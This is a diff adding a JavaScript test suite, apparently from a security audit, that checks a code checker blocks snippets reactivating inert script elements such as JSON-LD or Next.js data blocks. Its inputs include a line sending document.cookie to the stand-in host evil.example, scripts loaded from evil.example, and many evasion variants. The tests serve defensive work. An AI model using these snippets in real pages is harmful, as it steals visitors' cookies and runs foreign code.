@@ -1116,3 +1116,65 @@ describe('second audit (#48): numeric proofs that hold a string', () => {
     }
   })
 })
+
+describe('second audit (#48): an existing script element that never ran', () => {
+  const SNIPPETS = [
+    `const j = document.querySelector('[type="application/ld+json"]'); j.removeAttribute('type'); j.textContent = 'fetch("https://evil.example/?" + document.cookie)'`,
+    `const j = document.querySelector('#__NEXT_DATA__').cloneNode(); j.type = 'text/javascript'; j.textContent = 'alert(document.cookie)'; document.body.append(j)`,
+  ]
+  for (const snippet of SNIPPETS) {
+    it(`blocks: ${snippet}`, () => {
+      expect(blocks(snippet)).toBe(true)
+    })
+  }
+
+  it('blocks the snippet that sets src, even with the network capability declared', () => {
+    const snippet = `const j = document.querySelector('[type="application/ld+json"]'); j.removeAttribute('type'); j.src = 'https://evil.example/x.js'`
+    expect(blocks(snippet, ['network'])).toBe(true)
+    expect(blocks(snippet)).toBe(true)
+  })
+
+  it('blocks variants that change what makes a script element run', () => {
+    const j = `const j = document.querySelector('[type="application/ld+json"]'); `
+    for (const source of [
+      j + `j.type = 'text/javascript'`,
+      j + `j.setAttribute('type', 'text/javascript')`,
+      j + `j.toggleAttribute('type')`,
+      j + `j.removeAttribute('nomodule')`,
+      j + `j.noModule = false`,
+      j + `j.removeAttribute('language')`,
+      j + `j.removeAttribute('event')`,
+      j + `j.removeAttribute(document.title)`,
+      j + `j.removeAttributeNS(null, 'type')`,
+      j + `j.removeAttributeNode(j.getAttributeNode('type'))`,
+      j + `Object.assign(j, { type: 'text/javascript' })`,
+      j + `({ a: j.type } = { a: 'text/javascript' })`,
+      j + `j['ty' + 'pe'] = 'text/javascript'`,
+      j + `j.setAttribute('src', 'https://evil.example/x.js')`,
+      j + `Object.assign(j, { src: 'https://evil.example/x.js' })`,
+      j + `const c = j.cloneNode; c.call(j)`,
+      j + `j.cloneNode(true)`,
+      `document.querySelectorAll('li').forEach((li) => { li.type = 'text/javascript' })`,
+      `function f(e) { e.type = 'text/javascript' } f(document.body)`,
+      `class A { m() { this.type = 'text/javascript' } }`,
+      `const c = document.createElement('div'); let d = c; d = document.body; d.type = 'x'`,
+    ]) {
+      expect(blocks(source, ['network']), source).toBe(true)
+    }
+  })
+
+  it('still passes the same properties on an element made in the code, and on plain data', () => {
+    for (const source of [
+      `const i = document.createElement('input'); i.type = 'checkbox'; document.body.append(i)`,
+      `const b = document.createElement('button'); b.setAttribute('type', 'button'); b.removeAttribute('type')`,
+      `document.createElement('input').type = 'text'`,
+      `const b = document.createElement('button'); const c = b.cloneNode(true); document.body.append(c)`,
+      `const state = { type: 'a' }; state.type = 'b'`,
+      `const o = {}; o.event = 1`,
+    ]) {
+      expect(blocks(source), source).toBe(false)
+    }
+    expect(blocks(`const i = new Image(); i.src = 'https://example.com/a.png'`, ['network'])).toBe(false)
+    expect(blocks(`const i = document.createElement('img'); i.src = 'https://example.com/a.png'`, ['network'])).toBe(false)
+  })
+})
